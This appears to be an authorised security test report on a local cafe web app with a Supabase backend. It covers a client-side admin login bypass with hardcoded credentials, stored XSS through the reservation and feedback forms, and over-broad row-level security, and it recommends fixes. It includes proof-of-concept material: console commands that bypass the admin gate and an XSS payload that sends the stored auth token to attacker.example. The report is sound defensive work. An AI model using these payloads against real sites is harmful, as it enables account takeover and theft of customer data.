# Galaxy Cafe — Web App Exploit Hunt (Local Static Site)

- **Target:** `http://127.0.0.1:8000/index.html` (local server, your own project)
- **Mode:** Active testing (payloads executed against the real running app via headless Edge / DevTools Protocol)
- **Date:** 2026-06-29
- **Scope note:** Client-side app + Supabase backend. SQLi/SSTI/command-injection do not apply (no server-side template/SQL layer you control). The real attack surface is XSS, client-side auth, and Supabase RLS.
- **Important:** The fixes documented in `SECURITY_PATCHES.md` are **NOT applied** to the live `index.html`. It loads `supabase-config.js` (not the secure variant) and still uses plaintext admin creds.

Raw machine output: `sectest/xss_active_results.json`

---

## Findings summary

| # | Title | Severity | Status |
|---|-------|----------|--------|
| 1 | Client-side admin auth — hardcoded creds + trivial gate bypass | Critical | Actively confirmed |
| 2 | Stored XSS: customer reservation → admin dashboard | High | Actively confirmed |
| 3 | Stored XSS: customer feedback → admin dashboard | High | Actively confirmed |
| 4 | Stored/DOM XSS: inbox notices | Medium | Actively confirmed |
| 5 | Supabase RLS allows anon to read ALL reservations/orders/notices (PII/BOLA) | High | Analyzed (not actively queried — out of chosen scope) |

---

## 1. Client-side admin authentication — full bypass (Critical)

**Where:** `index.html:4401-4422`

```js
const ADMIN_ACCOUNTS = { admin:'admin123', manager:'manager123', chef:'chef123' };
function loginAdminFromHeader(username, password){
  const key = username.toLowerCase();
  if (ADMIN_ACCOUNTS[key] && ADMIN_ACCOUNTS[key] === password){ adminLoggedIn = true; ... }
}
```

Two independent breaks, both confirmed live:

- **Hardcoded plaintext creds** sit in source served to every visitor. `loginAdminFromHeader('admin','admin123')` returned `true`.
- **The gate is a client-side boolean.** Setting `adminLoggedIn = true` and calling `openAdminPanel()` opened the dashboard (`display: flex`) with **no credentials at all**.

**Impact:** Anyone can open the admin dashboard and change reservation statuses, edit menu/handi pricing, and trigger notices. Any authority on the client can be flipped in DevTools.

**PoC (browser console on the site):**
```js
adminLoggedIn = true; openAdminPanel();   // dashboard opens, no login
// or:
loginAdminFromHeader('admin','admin123'); // documented creds work
```

**Fix:** Admin privilege must be enforced server-side. Move privileged actions (reservation/order status, menu edits, notice sends) behind a Supabase **Edge Function** that verifies a Supabase Auth session with an `admin` claim, using the `service_role` key server-side only. Remove `ADMIN_ACCOUNTS` from the frontend entirely. A client boolean can never be a security boundary.

---

## 2 & 3. Stored XSS — customer input executes in the admin's browser (High)

**Entry points (unsanitised, raw `.value`):**
- Reservation form: `index.html:5204-5217` → `createReservation()` (`3915`) inserts `name/phone/email/occasion/handi_type/address` verbatim.
- Feedback form: `index.html:5170-5189` → `createFeedback()` (`3948`) inserts `customer/text` verbatim.

**Sinks (raw template interpolation into `innerHTML`):**
- `renderReservations()` `index.html:5366-5376` — `${res.name}`, `${res.email}`, `${res.address}`, `${res.occasion}`, …
- `renderFeedback()` `index.html:5541-5550` — `${fb.customer}`, `${fb.text}`

The secure sanitizer in `supabase-config-secure.js` is **never loaded**, and even if it were, the render path doesn’t call it. Supabase performs no HTML sanitisation, so the payload is stored and later rendered as live markup.

**Confirmed live:** injecting a reservation with `name = <img src=x onerror=...>` and calling the real `renderReservations()` produced a live `<img>` whose `onerror` fired (`fired: 1`). Rendered DOM evidence:
```
<img src="x" onerror="window.__xss.res++">
```
Feedback sink fired identically (`<svg onload>` + `<img onerror>`).

**Impact (customer → admin privilege escalation):** an unauthenticated customer books a table / leaves feedback with a script payload in a text field. When staff open the dashboard, attacker JS runs in the admin’s authenticated context: it can read the admin session, drive every admin action programmatically, exfiltrate all reservation/order PII, or steal the Supabase Auth JWT from `localStorage`.

**PoC payload (put in the Name field of the reservation form):**
```
<img src=x onerror="fetch('https://attacker.example/c?d='+encodeURIComponent(localStorage.getItem('sb-vbfjovksikjfnspyqexf-auth-token')||document.cookie))">
```

**Fix:** Stop building HTML from data. Either:
- Use `textContent` / `document.createElement` for all data-derived values (as PATCH 9 sketches), **or**
- HTML-escape every interpolated value, e.g.
  ```js
  const esc = s => String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
  // ...`<td>${esc(res.name)}</td>`
  ```
  Apply to `renderReservations`, `renderFeedback`, `renderInbox`, `renderMenuEdit` (and any other `${...}` in an `innerHTML` template). Add server-side validation in an Edge Function too — client sanitisation is bypassable via direct API calls.

---

## 4. Stored/DOM XSS — inbox notices (Medium)

**Where:** `renderInbox()` `index.html:4973-4985` interpolates `${n.title}` and `${n.body}` into `innerHTML`. Notice bodies are built from reservation data: `notifyUser()`→`createNoticeDb()` embeds `Hi ${res.name}, …` (`5589`, `4804-4816`).

**Confirmed live:** `fired: 2` with two live `<img onerror>` nodes rendered into `#inboxList`.

**Impact:** A malicious reservation `name` flows into the stored notice body; rendered unescaped in the recipient’s inbox. Also, because the `notices` SELECT policy is `USING(true)` (see #5), notice content is broadly readable. Lower severity than #2/#3 because delivery is keyed to the booker’s own email/phone, but it’s the same root cause (unescaped `innerHTML`).

**Fix:** Same escaping/`textContent` remediation as #2/#3.

---

## 5. Supabase RLS — anonymous read of all rows (High, analyzed)

**Where:** `supabase-rls-policies.sql`

```sql
-- reservations: SELECT allowed for anon/authenticated, NO row filter
CREATE POLICY "Users can read own reservations" ON reservations FOR SELECT
USING (auth.role() = 'authenticated' OR auth.role() = 'anon');   -- = everyone

CREATE POLICY "Anyone can read orders"  ON orders   FOR SELECT USING (true);
CREATE POLICY "Anyone can read notices" ON notices  FOR SELECT USING (true);
```

The policy name says “own reservations” but there is **no `phone`/`email` predicate** — any holder of the public `anon` key (printed in `supabase-config.js`) can read **every** reservation (name, phone, email), **every** order (customer, items, total, payment_id), and **every** notice. The SQL comments even admit “In production, you should filter by user_id.”

**Impact:** Internet-wide PII/BOLA disclosure. The anon key is public by design — RLS is the only control, and here it allows full table reads. This is independent of the local-vs-deployed question because the local app talks to the same live project.

**Status:** Reported from policy review. I did **not** fire queries at your live Supabase because you scoped this run to the local static site. I can confirm it with a single **read-only** request on request (one `GET .../rest/v1/reservations?select=*` with the anon key — exactly what the page already does on load).

**Fix:** Gate reads behind Supabase Auth and filter by the authenticated user, or move all reads for admin/customer dashboards into Edge Functions using `service_role`. At minimum, replace `USING(true)` with policies that match `auth.uid()` / the requester’s email/phone.

---

## What was tested and found safe / not applicable
- **Customer auth** uses Supabase Auth (`auth.signUp` / `signInWithPassword`) — no plaintext-password storage in `localStorage` (the `REMAINING_RISKS.md` note on that is stale).
- **Razorpay keys** — no Razorpay integration present in current `index.html` (stale risk note).
- **SQLi / SSTI / OS command injection** — not applicable (no server-side SQL/template surface you own; PostgREST + parameterised client).

## Suggested fix priority
1. Remove client-side admin auth; enforce admin via Edge Function + Auth claim (#1).
2. Escape/`textContent` all `innerHTML` data sinks (#2, #3, #4).
3. Tighten RLS SELECT policies; verify against live DB (#5).
